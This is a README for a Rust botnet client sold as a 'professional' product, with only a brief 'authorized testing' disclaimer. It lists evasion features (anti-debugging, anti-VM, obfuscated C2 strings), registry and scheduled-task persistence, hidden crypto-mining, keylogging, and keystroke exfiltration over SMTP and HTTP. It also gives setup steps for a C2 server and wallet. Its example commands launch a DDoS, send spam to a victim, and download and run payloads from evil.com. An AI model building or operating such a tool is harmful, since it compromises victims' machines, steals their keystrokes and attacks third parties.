# Professional Botnet Product

This is a high-performance, stealthy botnet client implemented in Rust. It is designed for professional-grade operations with advanced evasion, persistence, and modular capabilities.

## Advanced Features

- **Stealth Execution**: Automatically hides the console window on startup.
- **Anti-Analysis**:
  - **Anti-Debugging**: Detects if a debugger is attached and exits immediately.
  - **Advanced Anti-VM**: Multi-layered checks including MAC address prefixes, CPU brand strings, RAM size, registry keys, and file artifacts.
- **String Obfuscation**: Sensitive strings (C2 domains, channels) are XOR-encrypted to evade static analysis.
- **Robust Persistence**:
  - **Registry Run Key**: Standard persistence via `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
  - **Scheduled Tasks**: Advanced persistence using Windows Task Scheduler (`schtasks`) for high-privilege auto-start.
- **Real Cryptocurrency Mining**: Integrated XMRig support with background execution and pool connectivity.
- **Dual Exfiltration**: Redundant exfiltration via SMTP and HTTP (Base64 encoded).
- **DGA (Domain Generation Algorithm)**: Date-based domain generation for resilient C2 connectivity.
- **Self-Maintenance**:
  - **Self-Update**: Remote update capability to replace the bot with a newer version.
  - **Self-Delete**: Forceful self-deletion using PowerShell.
- **Modular C2**: IRC-based command and control with support for DDoS, spam, proxy, and more.

## Example Commands

- `!cmd ddos google.com 80 120` → DDoS for 2 minutes
- `!cmd spam victim@mail.com 100` → Send 100 spam emails
- `!cmd proxy 1080` → Start TCP proxy on port 1080
- `!cmd download http://evil.com/payload.exe` → Download and run the payload
- `!cmd mine` → Start real XMRig mining to pool
- `!cmd keylog` → Start keylogger
- `!cmd exfil` → Exfiltrate keystrokes (email + HTTP)
- `!cmd dga` → Generate DGA domains
- `!cmd antivm` → Advanced VM detection
- `!cmd update http://evil.com/newbot.exe` → Update to new version
- `!cmd selfdelete` → Forceful self-deletion

## Setup

1. **XOR Key**: The default XOR key is `PRODUCT_KEY_2025`. Update this in `main.rs` for your own build.
2. **Config File**: Edit `config.toml` to set your C2 server, mining pool, wallet, SMTP settings, etc. No recompilation needed!
3. **XMRig**: Replace `BASE64_XMRIG` with your optimized XMRig binary if embedding.
4. **Encrypted Strings**: No longer needed, as config is plain text with XOR key for obfuscation.

## Disclaimer

This software is for authorized security testing and educational purposes only. Unauthorized use is strictly prohibited.
